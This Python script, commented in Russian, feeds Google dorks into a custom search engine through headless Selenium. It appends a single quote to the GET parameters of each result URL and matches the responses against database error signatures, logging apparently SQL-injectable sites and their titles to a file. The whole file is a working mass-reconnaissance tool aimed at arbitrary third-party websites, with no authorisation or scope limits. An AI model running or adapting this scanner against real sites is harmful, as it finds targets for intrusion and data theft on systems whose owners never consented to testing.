import re
import time

import requests
from bs4 import BeautifulSoup
from selenium import webdriver

# Список регулярных выражений свидетельствующих что на web-странице есть SQL уязвимость
sql_errors = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQL Query fail.*", r"SQL syntax.*MariaDB server"),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"Warning.*PostgreSQL"),
    "Microsoft SQL Server": (
        r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*odbc_.*", r"Warning.*mssql_",
        r"Msg \d+, Level \d+, State \d+", r"Unclosed quotation mark after the character string",
        r"Microsoft OLE DB Provider for ODBC Drivers"),
    "Microsoft Access": (r"Microsoft Access Driver", r"Access Database Engine", r"Microsoft JET Database Engine",
                         r".*Syntax error.*query expression"),
    "Oracle": (
        r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Warning.*oci_.*", "Microsoft OLE DB Provider for Oracle"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error"),
    "SQLite": (r"SQLite/JDBCDriver", r"System.Data.SQLite.SQLiteException"),
    "Informix": (r"Warning.*ibase_.*", r"com.informix.jdbc"),
    "Sybase": (r"Warning.*sybase.*", r"Sybase message")
}


def checksql(html):
    for db, errors in sql_errors.items():
        for error in errors:
            if re.compile(error).search(html):
                return True, db
    return False, None


def checkcheck(url):
    # Заменяем в URL значок & между параметрами, добавляя перед ним одинарную кавычку
    # это нужно для тестирования GET параметров URL адреса на наличие SQL уязвимости
    x = url.replace("&", "'&")
    # Очищаем URL от пробелов по обеим сторонам
    ur = x.strip()
    # Если спереди нету http, то добавляем его
    if not (ur[0:4] == 'http'):
        ur = 'http://' + ur
    try:
        # Получаем HTML код по URL
        s = requests.get(ur + "'")
        h = s.text
        # Проверяем на уязвимости
        a, b = checksql(h)
        print('Проверяю: ' + ur + "'", end='')
        if not a:
            print()
        else:
            with open('sqls.txt', 'a', encoding='utf8') as file:
                print(' ---Уязвим----')
                soup = BeautifulSoup(h, "html.parser")
                title = ''
                try:
                    # Пытаемся вытянуть со страницы заголовок Title
                    title = soup.find('title').text
                    print(ur + "'" + '|' + title, file=file, flush=False)
                except Exception as exc:
                    print(ur + "'" + '|NOTITLE', file=file, flush=False)
    except Exception as exc:
        print(exc)


def check_links(mas):
    for x in mas:
        # Получаем сам url каждой ссылки поисковой выдачи
        s = x.get_attribute('data-ctorig')
        try:
            # Очищаем url от лишнего
            s = s.strip()
            s = s.replace(' ', '')
            s = s.replace('\n', '')
            s = s.replace('\r', '')
            # Проверяем очередной url
            checkcheck(s)
        except:
            pass


opts = webdriver.ChromeOptions()
opts.headless = True
browser = webdriver.Chrome(options=opts)

with open('dorks.txt', 'r', encoding='utf8') as dork_file:
    for dork in dork_file:
        dork = dork[:-1]
        print('Проверяю дорк ' + dork)
        # pred = ''
        # Через Selenium заходим на Custom Google Search Engine
        browser.get('https://cse.google.com/cse?cx=009462381166450434430:dqo-6rxvieq')
        # Находим поле ввода поиска
        login = browser.find_element_by_name('search')
        # Вводим в поле поиска текущий дорк
        login.send_keys(dork)
        # Находим кнопку Search
        search_button = browser.find_element_by_css_selector('.gsc-search-button')
        # Нажимаем на кнопку
        search_button.click()
        # Делаем паузу в 3 секунды, чтобы страницв успела подгрузиться
        time.sleep(3)
        page = 1
        while page <= 10:
            try:
                # Получаем ссылки поисковой выдачи в массив links
                print(f'--------Page {page}----------')
                # page_html = browser.page_source
                # soup = BeautifulSoup(page_html, 'lxml')
                # lnks = soup.find_all('a',class_="gs-title")
                # lnks.attrs
                # pprint(soup.select('a'))
                links = [i for i in browser.find_elements_by_css_selector('a[class="gs-title"]') if i.text != '']
                check_links(mas=links)
                # Находим ссылку на следующую страницу выдачи
                pages_links = browser.find_elements_by_xpath('//*[@class="gsc-cursor-page"]')
                page += 1
                next_page_link = [item for item in pages_links if item.text == str(page)][0]
                # Жмем на ссылку
                next_page_link.click()
                # Ждем пока прогрузится
                time.sleep(3)
            except Exception as exc:
                print(exc)
                break
        else:
            print('Проверка дорка закончена')
# Закрываем браузер через Selenium
browser.quit()
